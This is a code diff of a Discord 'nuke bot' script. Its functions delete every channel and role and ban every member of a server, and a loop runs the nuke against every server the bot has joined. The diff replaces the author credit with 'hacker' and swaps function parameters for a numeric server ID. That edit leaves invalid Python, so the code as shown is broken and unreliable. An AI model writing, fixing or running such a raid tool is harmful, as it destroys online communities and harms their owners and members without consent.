@@ -21,11 +21,11 @@ baner = f'''
 {r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
 {r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
 {r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
-{y}Made by: {g}https://github.com/Sigma-cc'''
+{y}Made by: {g}hacker'''
 
 
 
-async def delete_all_channel(guild):
+async def delete_all_channel(982158107117486110):
     deleted = 0
     for channel in guild.channels:
         try:
@@ -35,7 +35,7 @@ async def delete_all_channel(guild):
             continue
     return deleted
 
-async def delete_all_roles(guild):
+async def delete_all_roles(982158107117486110):
     deleted = 0
     for role in guild.roles:
         try:
@@ -45,7 +45,7 @@ async def delete_all_roles(guild):
             continue
     return deleted
 
-async def ban_all_members(guild):
+async def ban_all_members(982158107117486110):
     banned = 0
     for member in guild.members:
         try:
@@ -120,7 +120,7 @@ while True:
 [+]Logged as {client.user.name}
 [+]Bot in {len(client.guilds)} servers!''')
                 for guild in client.guilds:
-                    await nuke_guild(guild)
+                    await nuke_guild(982158107117486110)
                 await client.close()
         elif choice_type == '2':
             guild_id =  _input(f'{y}Input server id:{g}')
